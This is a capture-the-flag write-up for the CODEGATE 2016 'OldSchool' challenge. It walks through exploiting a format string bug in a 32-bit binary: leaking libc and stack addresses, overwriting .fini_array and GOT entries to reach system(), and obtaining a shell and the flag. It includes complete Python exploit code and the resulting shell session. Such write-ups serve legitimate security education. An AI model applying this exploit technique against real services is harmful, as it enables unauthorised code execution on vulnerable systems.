# CODEGATE 2016: OldSchool

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| CODEGATE | OldSchool | Pwnable | 490 |

### Description
> HackerSchool FTZ Level 20
>
> nc 175.119.158.131 17171
> [http://codegate.bpsec.co.kr/static/files/1502184fbce57b14b4c7193cea5f2d16](challenge)

## First steps

The challenge consists of a target vulnerable application and two of its linked libraries with the following build info:

```bash
$ gcc -v
Using built-in specs.
COLLECT_GCC=gcc
COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/4.9/lto-wrapper
Target: x86_64-linux-gnu
Configured with: ../src/configure -v --with-pkgversion='Debian 4.9.2-10' --with-bugurl=file:///usr/share/doc/gcc-4.9/README.Bugs --enable-languages=c,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-4.9 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --with-gxx-include-dir=/usr/include/c++/4.9 --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --enable-gnu-unique-object --disable-vtable-verify --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-4.9-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-4.9-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-4.9-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --with-arch-32=i586 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu
Thread model: posix
gcc version 4.9.2 (Debian 4.9.2-10) 

$ gcc -o oldschool oldschool.c -m32 -fstack-protector
```

Let's do the usual investigating:

```bash
$ file oldschool
oldschool; ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped
```

```bash
$ ./checksec.sh --file ./oldschool
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./oldschool
```

Pulling it through IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@1
  int v4; // edx@1
  char user_input; // [sp+0h] [bp-40Ch]@1
  int v6; // [sp+400h] [bp-Ch]@1
  int *v7; // [sp+408h] [bp-4h]@1

  v7 = &argc;
  v6 = *MK_FP(__GS__, 20);
  memset(&user_input, 0, 0x400u);
  printf("YOUR INPUT :");
  fgets(&user_input, 1020, _bss_start);
  printf("RESPONSE :");
  printf(&user_input);
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v6;
  return result;
}
```

As we can see there's trivial format string vulnerability here but the complexity of this challenge doesn't lie in the vulnerability finding so much as its (reliable) exploitation. Given that we have a fms vulnerability we have a so-called 'write-anything-anywhere' primitive which allows us to write any DWORD value to any address.

So we need to find a suitable target address for overwriting which will allow us to hijack EIP control. Since we don't have a reliable infoleak (we can't use our FMS vuln (yet) for this since we cannot incorporate its results into our fms exploit string) and we assume ASLR is enabled we will need a static address that gets dereferenced somewhere and whose contents influence control-flow. A classical target for this (since RELRO is not enabled for this binary) are the entries in the GOT table but if we look at our target's disassembly we can see the following:

```asm
.text:080484F9                 add     esp, 10h
.text:080484FC                 sub     esp, 0Ch
.text:080484FF                 push    offset aResponse ; "RESPONSE :"
.text:08048504                 call    _printf
.text:08048509                 add     esp, 10h
.text:0804850C                 sub     esp, 0Ch
.text:0804850F                 lea     eax, [ebp+s]
.text:08048515                 push    eax             ; format
.text:08048516                 call    _printf
.text:0804851B                 add     esp, 10h
.text:0804851E                 mov     eax, 0
.text:08048523                 mov     edx, [ebp+var_C]
.text:08048526                 xor     edx, large gs:14h
.text:0804852D                 jz      short loc_8048534
.text:0804852F                 call    ___stack_chk_fail
.text:08048534 ; ---------------------------------------------------------------------------
.text:08048534
.text:08048534 loc_8048534:                            ; CODE XREF: main+92j
.text:08048534                 lea     esp, [ebp-8]
.text:08048537                 pop     ecx
.text:08048538                 pop     edi
.text:08048539                 pop     ebp
.text:0804853A                 lea     esp, [ecx-4]
.text:0804853D                 retn
.text:0804853D main            endp
```

The only externally linked function that gets called after our fms is executed is the stack-cookie validation routine `___stack_chk_fail` and this routine only gets executed if we corrupt the saved stack cookie on the stack. Unfortunately we cannot do this as we don't know its address on the stack and as such cannot trigger `___stack_chk_fail` and have no suitable target for our GOT overwrite.

Luckily for us we have a writable `.fini_array` section:

```bash
$ readelf -S ./oldschool
There are 30 section headers, starting at offset 0x102c:

Section Headers:
  (...)
  [18] .init_array       INIT_ARRAY      080496d8 0006d8 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      080496dc 0006dc 000004 00  WA  0   0  4
```

Before it transfers control to an application the runtime linker processes initialization sections (.preinit_array, .init_array, .init) found in the application and its loaded libraries and when the application terminates the runtime linker processes its termination sections (.fini_array, .fini). These sections are effectively arrays of function pointers which point to the functions that are to be executed by the runtime linker:

```asm
.fini_array:080496DC _fini_array     segment dword public 'DATA' use32
.fini_array:080496DC                 assume cs:_fini_array
.fini_array:080496DC                 ;org 80496DCh
.fini_array:080496DC __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux
```

As we can see `.fini_array` holds the address of a destructor function which will be executed when the application terminates. So if we use our fms to overwrite the `.fini_array` entry with an address of our choice we can hijack EIP control upon application termination.

The next step is to determine where to redirect EIP control to. Since the application is compiled with `NX` support we will need to conduct some kind of ROP (or subclass thereof, like ret2libc) attack but in order to do that we will need to bypass ASLR which in this case requires an infoleak. Luckily we have a format string vulnerability in the target application which always functions leak an infoleak due to the ability for stack value disclosure.

Hence if we overwrite `.fini_array` with the start address of the target application's `main` routine upon termination the application will effectively 'restart' again and allow us to exploit the fms vulnerability a second time. This way we can include an infoleak in the first fms exploitation string from which we can derive the addresses required to craft a full ROP chain in the second fms exploitation string.

Now we have to ask ourselves how we will exploit the fms vulnerability the second time to pop a shell. Since we now have bypassed ASLR using our infoleak we will target the GOT entry of `printf` because if we manage to overwrite it with the address of the `system` function and redirect control flow back to the `main` routine a third time we end up with a situation where `printf` is called over our `user_input` which will actually come down to `system(user_input)`. In addition to overwriting the GOT entry of `printf` here we also need to make sure execution 'loops back' to the `main` routine's start address a third time to actually trigger the call to `system`. We do this by overwriting the GOT entry of `___stack_chk_fail` (since overwriting `.fini_array` a second time didn't work here) and writing garbage to the address of the saved stack cookie so that, upon exiting the main routine, the stack cookie protection mechanism will think a stack smashing attack has been carried out and call `___stack_chk_fail` which will effectively redirect control to `main` a third time.

In order to facilitate the above we will need to leak the following pointers:

* A pointer into libc
* A pointer into the stack

We can find a pointer into libc quite easily when inspecting the stack at the epilogue of the `main` routine:

```asm
  gdb-peda$ x/300xw $esp
  0xbffff870: 0xbffff88c  0x000003fc  0xb7fcfc00  0x00000006
  (...)
  0xbffffc90: 0xbffffcb0  0x00000000  0x00000000  0xb7e7b723
  0xbffffca0: 0x08048540  0x00000000  0x00000000  0xb7e7b723
  0xbffffcb0: 0x00000001  0xbffffd44  0xbffffd4c  0xb7fed7da
  0xbffffcc0: 0x00000001  0xbffffd44  0xbffffce4  0x080497ec
  0xbffffcd0: 0x08048230  0xb7fcf000  0x00000000  0x00000000
  0xbffffce0: 0x00000000  0xdffeebbc  0xef6a4fac  0x00000000
  0xbffffcf0: 0x00000000  0x00000000  0x00000001  0x080483a0
  0xbffffd00: 0x00000000  0xb7ff3020  0xb7e7b639  0xb7fff000
  0xbffffd10: 0x00000001  0x080483a0  0x00000000  0x080483c1
  gdb-peda$ disas 0xb7e7b723,+10
  Dump of assembler code from 0xb7e7b723 to 0xb7e7b72d:
     0xb7e7b723 <__libc_start_main+243>:  mov    DWORD PTR [esp],eax
     0xb7e7b726 <__libc_start_main+246>:  call   0xb7e92c00 <__GI_exit>
     0xb7e7b72b <__libc_start_main+251>:  xor    ecx,ecx
  End of assembler dump.
```

Here we can see the return address of `main()` back into the `__libc_start_main` routine. Note that the above is a stackdump on our local test machine with a different libc version so the offset of the pointer to the libc base address is slightly different but this can be calculated by finding the address of the equivalent return point into `__libc_start_main` in the supplied `libc-2.21.so` library. We can find a pointer into the stack in a similar fashion and determine its offset to the saved cookie to obtain its stack storage address. We can leak both pointers by exploiting the fms vulnerability using `%index$x` where index is the DWORD-offset on the stack of our target.

## Stage 1

Stage 1 of the attack consists of transforming the fms vulnerability into a reliable infoleak which is done as follows:

```python
  # offset of our dst_addr in our buffer (in DWORDs)
  offset_1 = 7 + 4
  # libc pointer leak offset (in DWORDs)
  offset_2 = 267
  # stack pointer leak offset (in DWORDs)
  offset_3 = 264

  # .fini_array address
  dst_addr = 0x080496DC
  # <main+0> address
  lsb_overwrite = 0x849B
  # how many bytes to output to set internal written counter to lsb_overwrite
  val = (lsb_overwrite - (16 + 4))

  # Construct FMS exploit string
  return chr(0x25) + str(offset_2) + '$08x' + chr(0x25) + str(offset_3) + '$08x' + pack('<I', dst_addr) + chr(0x25) + str(val) + 'x' + chr(0x25) + str(offset_1) + '$hn.'
```

Which constructs the fms exploit string `%267$08x%264$08x[.fini_array_lsb_address]%valx%11$hn.` which executes a short-write (ie. it writes the number of bytes printed by the fms as a short to the target address). Note that in the above we only have to overwrite the least significant 16 bits of the pointer stored at `.fini_array` since the original pointer and the overwriting pointer are both function pointers to the target application.

## Stage 2

When we have the leaked pointers we can determine the stack cookie address and address of `system()` and execute our stage 2:

```python
def construct_stage_2(stackcookie_addr, system_addr):
  # Offsets of first 3 DWORDs of our buffer on stack and the saved stack cookie (in DWORDs)
  offset = [7, 8, 9, 10]

  # .got:__stack_chk_fail address
  dst_addr_1 = 0x080497E4
  # <main+0> address
  main_lsb = 0x849B

  # .got:printf address
  dst_addr_2 = 0x080497DC
  # __libc_system address
  # LSBs and MSBs are written seperately in short writes
  system_lsb = (system_addr & 0x0000FFFF)
  system_msb = ((system_addr & 0xFFFF0000) >> 16)

  # Addresses to write to
  adr = [0, 0, 0, 0]
  # Values to print to adjust internal output counter for writing
  val = [0, 0, 0, 0]

  # these bytes will have been already output (for addresses) upon first fms output
  already_written = (4 * 4)

  # We write in ascending order of size
  # main_lsb is smallest
  if ((main_lsb < system_lsb) and (main_lsb < system_msb)):
    # write main_lsb first
    adr[0] = (dst_addr_1)
    val[0] = (main_lsb - already_written)

    if (system_lsb < system_msb):
      # write system_lsb next
      adr[1] = (dst_addr_2)
      val[1] = (system_lsb - main_lsb)

      adr[2] = (dst_addr_2 + 2)
      val[2] = (system_msb - system_lsb)
    else:
      # write system_msb next
      adr[1] = (dst_addr_2 + 2)
      val[1] = (system_msb - main_lsb)

      adr[2] = (dst_addr_2)
      val[2] = (system_lsb - system_msb)

  # system_lsb is smallest
  elif ((system_lsb < main_lsb) and (system_lsb < system_msb)):
    # write system_lsb first
    adr[0] = (dst_addr_2)
    val[0] = (system_lsb - already_written)

    if (main_lsb < system_msb):
      # write main_lsb next
      adr[1] = (dst_addr_1)
      val[1] = (main_lsb - system_lsb)

      adr[2] = (dst_addr_2 + 2)
      val[2] = (system_msb - main_lsb)
    else:
      # write system_msb next
      adr[1] = (dst_addr_2 + 2)
      val[1] = (system_msb - system_lsb)

      adr[2] = (dst_addr_1)
      val[2] = (main_lsb - system_msb)

  # system_msb is smallest
  elif ((system_msb < main_lsb) and (system_msb < system_lsb)):
    # write system_msb first
    adr[0] = (dst_addr_2 + 2)
    val[0] = (system_msb - already_written)

    if (main_lsb < system_lsb):
      # write main_lsb next
      adr[1] = (dst_addr_1)
      val[1] = (main_lsb - system_msb)

      adr[2] = (dst_addr_2)
      val[2] = (system_lsb - main_lsb)
    else:
      # write system_lsb next
      adr[1] = (dst_addr_2)
      val[1] = (system_lsb - system_msb)

      adr[2] = (dst_addr_1)
      val[2] = (main_lsb - system_lsb)

  # Set up clobbering of saved stack cookie
  adr[3] = stackcookie_addr

  if ((val[2] & 0xFF) != 0):
    if ((val[2] & 0xFF) == 0xFF):
      val[3] = 2
    else:
      val[3] = 1
  else:
    val[3] = 1
  return pack('<I', adr[0]) + pack('<I', adr[1]) + pack('<I', adr[2]) + pack('<I', adr[3]) + chr(0x25) + str(val[0]) + 'x' + chr(0x25) + str(offset[0]) + '$hn'  + chr(0x25) + str(val[1]) + 'x' + chr(0x25) + str(offset[1]) + '$hn'  + chr(0x25) + str(val[2]) + 'x' + chr(0x25) + str(offset[2]) + '$hn' + chr(0x25) + str(offset[3]) + '$hn'
```

Here we overwrite the LSBs of `.got:__stack_chk_fail` with the LSBs of `main()`, overwrite `.got:printf` with the address of `system()` and overwrite the saved stack cookie with junk (note that this can be anything as long as its least significant byte is not 0x00 because stack cookie generation makes sure a stack cookie always has 0x00 as its least significant byte to complicate stack buffer overflow exploitation efforts).

There is some minor headache involved here because the nature of the format string `%n` and `%hn` specifiers mean that we always write the number of bytes printed so far to the target address which means that if we want to write a small and a large value we need to write the small value first and then the large value. As such we sort the order of address we write to and the values we write to them (rather inefficiently). Obviously the right way to go about doing this is by simply sorting an array of (address, value) tuples in ascending order on the value field but oh well.

## Putting it all together

Now that we have our exploit-generation code for the two stages we can [put it all together as follows](solution/oldschool_sploit.py):

```python
cmd = '/bin/sh'
libc_offsets = {'2.21': {'libc_start_main_ret': 0x0001873E, 'system': 0x0003B180}}
version = '2.21'
libc_start_main_ret_offset = libc_offsets[version]['libc_start_main_ret']
system_offset = libc_offsets[version]['system']
cookie_ptr_offset = (0xF8 + 0xC)

host = '175.119.158.131'
port = 17171

h = remote(host, port, timeout = None)

print "[*] Executing stage 1..."

libc_base_addr, stackcookie_addr = stage_1(h)
libc_base_addr = (libc_base_addr - libc_start_main_ret_offset)
system_addr = (libc_base_addr + system_offset)
stackcookie_addr = (stackcookie_addr - cookie_ptr_offset)

print "[+] Got libc base address: [%x]" % libc_base_addr
print "[+] Got system() address: [%x]" % system_addr
print "[+] Got stack cookie address: [%x]" % stackcookie_addr

print "[*] Executing stage 2..."

stage_2(h, stackcookie_addr, system_addr, cmd)

h.close()
```

Which, when executed, gives us:

```bash
$ ./oldschool_sploit.py 
[+] Opening connection to 175.119.158.131 on port 17171: Done
[*] Executing stage 1...
[+] Got libc base address: [b754e000]
[+] Got system() address: [b7589180]
[+] Got stack cookie address: [bfd7c41c]
[*] Switching to interactive mode

     sh: 1: YOUR: not found
sh: 1: RESPONSE: not found
$ id
uid=1001(oldschool) gid=1001(oldschool) groups=1001(oldschool)
$ ls -la
total 77
drwxr-xr-x  21 root root  4096 Mar  8 14:37 .
drwxr-xr-x  21 root root  4096 Mar  8 14:37 ..
drwxr-xr-x   2 root root  4096 Mar  8 15:40 bin
drwxr-xr-x   4 root root  1024 Mar  8 14:44 boot
drwxr-xr-x  19 root root  4320 Mar 13 03:27 dev
drwxr-xr-x  94 root root  4096 Mar 12 22:22 etc
drwxr-xr-x   4 root root  4096 Mar 12 22:13 home
lrwxrwxrwx   1 root root    32 Mar  8 14:37 initrd.img -> boot/initrd.img-4.2.0-16-generic
drwxr-xr-x  20 root root  4096 Mar  8 15:39 lib
drwx------   2 root root 16384 Mar  8 14:36 lost+found
drwxr-xr-x   3 root root  4096 Mar  8 14:37 media
drwxr-xr-x   2 root root  4096 Oct 19 18:14 mnt
drwxr-xr-x   2 root root  4096 Oct 22 02:27 opt
dr-xr-xr-x 160 root root     0 Mar 10 21:29 proc
drwx------   2 root root  4096 Mar  8 14:36 root
drwxr-xr-x  22 root root   780 Mar 13 19:01 run
drwxr-xr-x   2 root root  4096 Mar  8 15:40 sbin
drwxr-xr-x   2 root root  4096 Oct 22 02:27 srv
dr-xr-xr-x  13 root root     0 Mar 12 22:00 sys
drwxrwxrwt   8 root root  4096 Mar 13 23:17 tmp
drwxr-xr-x  10 root root  4096 Mar  8 14:36 usr
drwxr-xr-x  12 root root  4096 Mar  8 14:43 var
lrwxrwxrwx   1 root root    29 Mar  8 14:37 vmlinuz -> boot/vmlinuz-4.2.0-16-generic
$ ls -la /home/oldschool
total 40
drwxr-xr-x 3 root      root      4096 Mar 13 00:12 .
drwxr-xr-x 4 root      root      4096 Mar 12 22:13 ..
-rw-r--r-- 1 root      root        20 Mar 12 23:10 6a39364a7346534d16ca88ae39d20f27_flag.txt
-rw-r--r-- 1 oldschool oldschool  220 Mar 12 22:13 .bash_logout
-rw-r--r-- 1 oldschool oldschool 3771 Mar 12 22:13 .bashrc
drwx------ 2 oldschool oldschool 4096 Mar 12 22:14 .cache
-rwxr-xr-x 1 root      root      5340 Mar 11 00:50 oldschool
-rw-r--r-- 1 root      root      1648 Mar 11 00:50 oldschool.c
-rw-r--r-- 1 oldschool oldschool  675 Mar 12 22:13 .profile
$ cat /home/oldschool/6a39364a7346534d16ca88ae39d20f27_flag.txt
R3st_1n_P34c3_FSB:(
```